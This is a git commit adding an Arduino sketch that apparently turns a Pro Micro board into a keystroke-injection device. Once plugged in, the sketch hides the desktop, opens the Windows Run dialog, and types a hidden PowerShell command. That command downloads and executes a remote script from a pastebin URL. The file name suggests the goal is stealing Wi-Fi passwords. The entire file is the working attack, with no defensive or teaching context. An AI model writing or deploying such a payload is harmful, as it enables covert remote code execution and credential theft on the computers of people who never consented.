3ae4c72bdf5ede28a1006147d0bfccb6731b2150
psychovill <49252733+psychovill@users.noreply.github.com>
2019-06-25 20:36:28 +0530

    Add files via upload

---
+++ promicroWifiPwd.ino
@@ -0,0 +1,36 @@
+#include "Keyboard.h"
+void typeKey(int key)
+{
+  Keyboard.press(key);
+  delay(500);
+  Keyboard.release(key);
+}
+void setup() {
+}
+
+void loop() {
+  Keyboard.begin();
+
+  // Wait 500ms
+  delay(500);
+  Keyboard.press(0);
+  Keyboard.releaseAll();
+  delay(800);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('d');
+  Keyboard.releaseAll();
+  delay(800);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(1500);
+  Keyboard.print("powershell -windowstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/tUWtSWb7');\"");
+  delay(100);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.end();
+  for(;;){ /*empty*/ }
+}
+
+
+
+
